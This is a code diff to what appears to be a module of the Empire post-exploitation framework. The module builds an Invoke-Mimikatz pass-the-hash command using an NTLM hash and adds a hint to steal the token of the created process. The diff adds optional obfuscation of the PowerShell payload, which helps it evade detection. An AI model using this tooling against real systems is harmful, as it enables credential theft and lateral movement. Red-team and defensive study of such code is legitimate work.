@@ -75,11 +75,13 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -120,8 +122,10 @@ class Module:
         command += " /ntlm:" + self.options["ntlm"]['Value']
 
         # base64 encode the command to pass to Invoke-Mimikatz
-        script += "Invoke-Mimikatz -Command '\"" + command + "\"'"
+        scriptEnd = "Invoke-Mimikatz -Command '\"" + command + "\"'"
 
-        script += ';"`nUse credentials/token to steal the token of the created PID."'
-        
+        scriptEnd += ';"`nUse credentials/token to steal the token of the created PID."'
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
